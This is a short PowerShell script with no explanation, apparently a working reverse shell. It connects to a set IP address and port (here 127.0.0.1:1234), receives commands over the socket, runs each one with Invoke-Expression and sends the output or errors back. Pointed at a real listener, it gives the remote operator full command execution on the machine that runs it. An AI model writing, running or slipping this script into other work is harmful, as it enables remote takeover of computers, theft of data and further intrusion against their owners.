$ip = "127.0.0.1"
$port = "1234"
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$buffer = New-Object byte[] 1024

while (($bytes = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $data = (New-Object -TypeName Text.ASCIIEncoding).GetString($buffer, 0, $bytes).Trim()

    if (![string]::IsNullOrWhiteSpace($data)) {
        try {
            # Execute the received command and capture output/errors
            $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String)
        } catch {
            # Send back any exceptions or errors
            $sendback = "Error: $_"
        }
    } else {
        $sendback = "[+] Command executed but produced no output."
    }

    $writer.WriteLine($sendback.Trim())
    $writer.Flush()
}

$client.Close()
